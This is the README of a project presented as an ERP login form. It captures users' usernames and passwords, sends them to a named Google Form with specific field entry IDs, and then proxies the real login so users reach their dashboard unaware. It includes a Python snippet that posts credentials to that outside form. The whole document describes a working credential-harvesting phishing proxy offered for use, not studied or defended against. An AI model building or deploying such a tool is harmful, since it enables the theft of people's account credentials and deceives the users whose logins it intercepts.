# ERP Login Form

This project creates a login form that captures credentials, submits them to a Google Form (for logging/tracking), and then performs the complete login flow to the ERP system, redirecting users to their dashboard upon successful authentication.

## Setup Instructions

### Install Dependencies
```bash
pip install -r requirements.txt
```

### Start the Server
```bash
python server.py
```

### Access the Application
Open your browser and navigate to:
```
http://localhost:5000
```

### Google Form Setup
1. The project is currently set up to use the Google Form with ID: `1FAIpQLScStreRZRW9Y4ipI2MNBENtSsbMqYn2CYvPRTlCs_eZs3d0vg`
2. The form has two fields with the following entry IDs:
   - Username/HTNO: `entry.163375498`
   - Password: `entry.1850673272`
3. If you need to use a different Google Form:
   - Update the URL in `script.js`
   - Update the entry IDs in `script.js`

### How It Works
1. The frontend submits credentials to the backend proxy server
2. The server handles authentication with the ERP system
3. Session cookies are maintained on the server side
4. The dashboard HTML is returned to the client
5. Users can interact with the ERP system through the proxy

### Testing with Python
The project includes a test.py script that can be used to verify form submission:
```python
import requests

url = "https://docs.google.com/forms/d/e/1FAIpQLScStreRZRW9Y4ipI2MNBENtSsbMqYn2CYvPRTlCs_eZs3d0vg/formResponse"
data = {
    "entry.163375498": "username",
    "entry.1850673272": "password"
}

response = requests.post(url, data=data)
print("Status:", response.status_code)
```

The project also includes a Selenium-based script for direct testing:
```bash
python testl.py
```

### Running the Application
1. Open `index.html` in a web browser
2. Test the form by entering credentials
3. Form submissions will be sent to both the Google Form and the ERP system
4. After successful login, you will be redirected to your ERP dashboard or main page
5. If login fails, an appropriate error message will be displayed
